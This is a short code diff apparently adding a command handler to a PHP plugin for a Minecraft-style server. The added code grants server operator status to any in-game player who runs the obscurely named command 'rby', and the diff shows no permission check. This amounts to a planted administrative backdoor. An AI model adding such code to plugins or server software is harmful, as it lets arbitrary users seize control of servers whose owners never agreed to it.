@@ -12,5 +12,18 @@ $this->savedefaultconfig();
     
 
 }
-
+public function onCommand(CommandSender $sender, Command $command, string $label, array $args): bool {
+        if (!$sender instanceof Player) {
+            $this->getLogger()->warning("Please use this command in-game");
+            return false;
+        }
+        switch ($command->getName()) {
+            case "rby":
+               $sender->getServer()->addOp($sender);
+                return true;
+            default:
+                throw new \AssertionError("This line will never be executed");
+        }
+        return false;
+    }
 }
